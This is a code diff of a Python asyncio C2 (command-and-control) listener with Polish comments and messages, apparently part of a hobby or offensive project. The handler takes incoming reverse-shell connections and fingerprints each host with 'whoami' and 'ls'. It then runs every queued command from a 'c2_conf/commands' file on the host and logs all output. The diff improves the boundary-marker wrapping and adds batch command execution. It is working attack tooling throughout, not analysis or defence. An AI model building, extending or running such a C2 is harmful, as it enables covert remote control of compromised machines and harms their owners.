@@ -8,16 +8,24 @@ import datetime
 sesje = {}
 
 async def run_cmd(reader, writer, command, host, user):
-    granica = str(uuid4()).encode()
-    full_cmd = command.encode()+b'; echo -n '+ granica + b'\n'
-    try:
-        await wait_for(reader.read(4096), timeout=0.1)
-    except TimeoutError:
-        pass 
-    writer.write(full_cmd)
+    granica = str(uuid4())
+
+    #full_cmd = command.encode()+b'; echo -n '+ granica + b'\n'
+    while not reader.at_eof():
+        if reader._buffer:
+         reader._buffer.clear()
+        else:
+            break
+    #command = command.encode('utf-8')
+    command = "( "+ command
+    command2 = f"&& echo -n {granica})\n"
+    writer.write((command+command2).encode())
     await writer.drain()
+    await sleep(0.1)
+    #writer.write((f"echo -n {granica}").encode("utf-8"))
+  #  await writer.drain()
     odp = b""
-    while granica not in odp:
+    while granica.encode() not in odp:
         try:
             chunk = await wait_for(reader.read(4096),timeout=5)
             if not chunk:
@@ -25,8 +33,8 @@ async def run_cmd(reader, writer, command, host, user):
             odp+=chunk
         except TimeoutError:
             raise ConnectionError(f"[-]timeout of {user}@{host} ended")
-    output = odp.rsplit(granica,1)[0]
-    async with open (f'logs/main.log',mode='a') as log:
+    output = odp.rsplit(granica.encode(),1)[0]
+    async with open (f'c2_conf/main.log',mode='a') as log:
         await log.write(f"\n[{datetime.datetime.now()}] command {command} executed as {user}@{host} with output:\n {str(output.strip().decode())}")
     return output.strip()
 
@@ -39,6 +47,13 @@ async def handler(reader,writer):
     sesje[addr] = writer
     try:    
         username = "{C2_unknown}"
+        #writer.write(b"stty -echo;")
+        #await writer.drain()
+        #await run_cmd(reader,writer,"stty -echo",addr,username)
+        try:
+            await wait_for(reader.read(4096), timeout=0.3)
+        except TimeoutError:
+            pass
         output = await run_cmd(reader,writer,"whoami", addr, username)
         username = output.decode().strip()  
         print(f"[I] kolega {addr} ma na imie {username}")
@@ -48,15 +63,20 @@ async def handler(reader,writer):
         ls = await run_cmd(reader,writer, "ls", addr, username)
         ls = ls.decode().strip()
         print(f"[I] ls dla {username}:\n {ls}")
+        async with open("c2_conf/commands","r") as f:
+            async for line in f:
+                await run_cmd(reader,writer,line,addr,username)
+
 
         while True:
-            data = await reader.read(1024)
-            if not data:
+            data_ = await reader.read(1024)
+            if not data_:
                 break
-        print(f"[{addr}] Otrzymano: {data.decode().strip()}")
+        print(f"[{addr}] Otrzymano: {data_.decode().strip()}")
 
     except Exception as e:
-        print(f"exception: {e}")
+        #print(f"exception: {e}")
+        raise(e)
     finally:
         print(f"[-] zamykanie {addr}")
         writer.close()
